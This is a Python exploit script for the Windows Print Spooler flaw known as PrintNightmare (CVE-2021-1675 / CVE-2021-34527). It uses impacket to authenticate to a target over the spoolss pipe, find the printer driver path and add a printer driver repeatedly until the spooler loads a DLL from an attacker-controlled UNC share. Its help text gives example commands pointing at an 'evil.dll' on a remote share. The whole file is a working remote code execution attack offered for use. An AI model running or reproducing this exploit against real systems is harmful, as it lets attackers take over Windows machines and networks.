#!/usr/bin/python3
from impacket.dcerpc.v5 import rprn
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.structure import Structure
import argparse
import sys
import pathlib

#https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/2825d22e-c5a5-47cd-a216-3e903fd6e030
class DRIVER_INFO_2_BLOB(Structure):
    structure = (
        ('cVersion','<L'),
        ('NameOffset', '<L'),
        ('EnvironmentOffset', '<L'),
        ('DriverPathOffset', '<L'),
        ('DataFileOffset', '<L'),
        ('ConfigFileOffset', '<L'),
    )

    def __init__(self, data = None):
        Structure.__init__(self, data = data)
    
    def fromString(self, data, offset=0):
        Structure.fromString(self, data)
        self['ConfigFileArray'] = self.rawData[self['ConfigFileOffset']+offset:self['DataFileOffset']+offset].decode('utf-16-le')
        self['DataFileArray'] = self.rawData[self['DataFileOffset']+offset:self['DriverPathOffset']+offset].decode('utf-16-le')
        self['DriverPathArray'] = self.rawData[self['DriverPathOffset']+offset:self['EnvironmentOffset']+offset].decode('utf-16-le')
        self['EnvironmentArray'] = self.rawData[self['EnvironmentOffset']+offset:self['NameOffset']+offset].decode('utf-16-le')
        #self['NameArray'] = self.rawData[self['NameOffset']+offset:len(self.rawData)].decode('utf-16-le')

class DRIVER_INFO_2_ARRAY(Structure):
    def __init__(self, data = None, pcReturned = None):
        Structure.__init__(self, data = data)
        self['drivers'] = list()
        remaining = data
        if data is not None:
            for i in range(pcReturned):
                attr = DRIVER_INFO_2_BLOB(remaining)
                self['drivers'].append(attr)
                remaining = remaining[len(attr):]

def connect(username, password, domain, lmhash, nthash, address, port):
    binding = r'ncacn_np:{0}[\PIPE\spoolss]'.format(address)
    rpctransport = transport.DCERPCTransportFactory(binding)
    
    rpctransport.set_dport(port)
    rpctransport.setRemoteHost(address)
    
    if hasattr(rpctransport, 'set_credentials'):
        # This method exists only for selected protocol sequences.
        rpctransport.set_credentials(username, password, domain, lmhash, nthash)
    
    print("[*] Connecting to {0}".format(binding))
    try:
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(rprn.MSRPC_UUID_RPRN)
    except:
        print("[-] Connection Failed")
        sys.exit(1)
    print("[+] Bind OK")
    return dce


def getDriver(dce, handle=NULL):
    #get drivers
    resp = rprn.hRpcEnumPrinterDrivers(dce, pName=handle, pEnvironment="Windows x64\x00", Level=2)
    blobs = DRIVER_INFO_2_ARRAY(b''.join(resp['pDrivers']), resp['pcReturned'])
    for i in blobs['drivers']:
        if "filerepository" in i['DriverPathArray'].lower():
            return i
    
    print("[-] Failed to find driver")
    sys.exit(1)


def main(dce, pDriverPath, share, handle=NULL):
    #build DRIVER_CONTAINER package
    container_info = rprn.DRIVER_CONTAINER()
    container_info['Level'] = 2
    container_info['DriverInfo']['tag'] = 2
    container_info['DriverInfo']['Level2']['cVersion']     = 3
    container_info['DriverInfo']['Level2']['pName']        = "1234\x00"
    container_info['DriverInfo']['Level2']['pEnvironment'] = "Windows x64\x00"
    container_info['DriverInfo']['Level2']['pDriverPath']  = pDriverPath + '\x00'
    container_info['DriverInfo']['Level2']['pDataFile']    = "{0}\x00".format(share)
    container_info['DriverInfo']['Level2']['pConfigFile']  = "C:\\Windows\\System32\\winhttp.dll\x00"
    
    flags = rprn.APD_COPY_ALL_FILES | 0x10 | 0x8000
    filename = share.split("\\")[-1]

    resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
    print("[*] Stage0: {0}".format(resp['ErrorCode']))

    container_info['DriverInfo']['Level2']['pConfigFile']  = "C:\\Windows\\System32\\kernelbase.dll\x00"
    for i in range(1, 30):
        try:
            container_info['DriverInfo']['Level2']['pConfigFile'] = "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{0}\\{1}\x00".format(i, filename)
            resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
            print("[*] Stage{0}: {1}".format(i, resp['ErrorCode']))
            if (resp['ErrorCode'] == 0):
                print("[+] Exploit Completed")
                sys.exit()
        except Exception as e:
            #print(e)
            pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help = True, description = "MS-RPRN PrintNightmare CVE-2021-1675 / CVE-2021-34527 implementation.",formatter_class=argparse.RawDescriptionHelpFormatter,epilog="""
Example;
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll'
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll' 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL'
    """)
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('share', action='store', help='Path to DLL. Example \'\\\\10.10.10.10\\share\\evil.dll\'')
    parser.add_argument('pDriverPath', action='store', help='Driver path. Example \'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL\'', nargs="?")
    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group = parser.add_argument_group('connection')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    import re
    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
        options.target).groups('')

    #In case the password contains '@'
    if '@' in address:
        password = password + '@' + address.rpartition('@')[0]
        address = address.rpartition('@')[2]

    if options.target_ip is None:
        options.target_ip = address

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    #connect
    dce = connect(username, password, domain, lmhash, nthash, options.target_ip, options.port)
    #handle = "\\\\{0}\x00".format(address)
    handle = NULL

    #find "C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL" path
    if not options.pDriverPath:
        try:
            blob = getDriver(dce, handle)
            pDriverPath = str(pathlib.PureWindowsPath(blob['DriverPathArray']).parent) + '\\UNIDRV.DLL'
            if not "FileRepository" in pDriverPath:
                print("[-] pDriverPath {0}, expected :\\Windows\\System32\\DriverStore\\FileRepository\\.....".format(pDriverPath))
                print("[-] Specify pDriverPath manually")
                sys.exit(1)
        except Exception as e:
            print('[-] Failed to enumerate remote pDriverPath')
            print(str(e))
            sys.exit(1)
    else:
        pDriverPath = options.pDriverPath

    if "\\\\" in options.share:
        options.share = options.share.replace("\\\\","\\??\\UNC\\")

    print("[+] pDriverPath Found {0}".format(pDriverPath))
    print("[*] Executing {0}".format(options.share))

    #re-run if stage0/stageX fails
    print("[*] Try 1...")
    main(dce, pDriverPath, options.share)
    print("[*] Try 2...")
    main(dce, pDriverPath, options.share)
    print("[*] Try 3...")
    main(dce, pDriverPath, options.share)
